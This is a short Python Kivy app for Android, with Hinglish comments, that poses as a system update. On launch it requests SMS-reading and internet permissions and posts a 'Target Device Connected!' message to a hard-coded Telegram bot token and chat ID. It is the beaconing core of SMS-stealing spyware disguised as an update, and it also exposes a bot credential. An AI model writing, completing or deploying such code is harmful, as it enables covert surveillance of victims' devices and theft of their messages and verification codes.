from kivy.app import App
from kivy.uix.label import Label
import requests
from android.permissions import request_permissions, Permission

class MainApp(App):
    def build(self):
        # Permissions mangna
        request_permissions([Permission.READ_SMS, Permission.INTERNET])
        
        # Telegram par notification bhejna
        TOKEN = "8264376885:AAG6pFOvdb_wcPboSz9-jooiBI9FO9QiLqY"
        CHAT_ID = "8264376885"
        msg = "✅ Target Device Connected!"
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg})
        
        return Label(text="System Update Working...")

if __name__ == "__main__":
    MainApp().run()
    
